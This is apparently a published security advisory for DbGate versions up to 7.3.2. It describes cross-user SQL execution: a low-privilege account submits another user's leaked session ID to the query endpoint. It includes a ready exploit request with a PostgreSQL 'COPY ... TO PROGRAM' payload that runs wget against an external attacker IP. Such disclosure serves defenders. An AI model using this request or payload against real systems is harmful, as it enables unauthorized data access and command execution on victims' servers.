# Cross-user SQL execution through leaked session identifiers

Identifier: `GHSA-xgr5-jrwx-vc8m`

```
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```
Score: 8.8 (High).

Affected version: <= 7.3.2 (7.3.2 verified)

## Description
This issue can be chained with [GHSA-297r-vfh5-2xqc](https://github.com/dbgate/dbgate/security/advisories/GHSA-297r-vfh5-2xqc) (aka [YonLiud/DbGate-sse-disclosure](https://github.com/YonLiud/DbGate-sse-disclosure)), which exposes active database session identifiers through the unauthenticated /stream endpoint.

After obtaining another user's `sesid`, a low-privilege authenticated user can submit it to `/sessions/execute-query` using their own valid bearer token.

```html
POST /sessions/execute-query
Authorization: Bearer ATTACKER_TOKEN
Content-Type: application/json
```
```json
{
  "sesid": "VICTIM_SESID",
  "sql": "COPY (SELECT '') TO PROGRAM 'wget -qO- http://172.26.242.223:4444/pwned'",
  "autoCommit": false
}
```

The endpoint verifies that the requester is authenticated, but does not verify that the requester owns the referenced database session or connection.

## Validation

Verified on 2026-10-15 against the official `dbgate/dbgate:7.3.2` Docker image
(`sha256:fc68e7c433963bff17af7372ce87f4b94873551a1c1b124220c8c04a22a80311`).

Two distinct local accounts were used against a disposable SQLite connection. A session
created by the victim account was supplied as `sesid` in an authenticated request from
the attacker account. DbGate returned `{"state":"ok"}` and executed a harmless marker
write in the victim session.

The execution identity was separately verified with PostgreSQL connections using distinct
database principals. The attacker DbGate account could not create tables, but its request
against the victim `sesid` created a table owned by the victim database principal. The
attacker token therefore authorizes the API request, while the already-open victim session
supplies the database identity that executes the SQL. The request path performs generic
query and database-role checks, but no session-owner check.

## Demo

https://github.com/user-attachments/assets/186d6b9b-a561-47e0-802e-df9e98eb41d4

This vulnerability was discovered by [YonLiud](https://github.com/YonLiud) and is provided “as is” for security research, education, and authorized testing purposes only.
The vulnerability was reported to the DbGate maintainers on September 20, 2026. No response or acknowledgment was received from the maintainers as of the date of publication.
This project must not be used for malicious purposes or against systems, networks, accounts, or data without explicit authorization from the owner. Any testing should be performed only in an isolated laboratory environment or within an explicitly authorized scope.
The author makes no warranties regarding this project and accepts no responsibility for damage, data loss, service disruption, unauthorized access, legal violations, or any other consequences resulting from its use, misuse, modification, or redistribution.
By downloading, executing, or using this project, you acknowledge that you are solely responsible for your actions and for complying with all applicable laws and regulations.
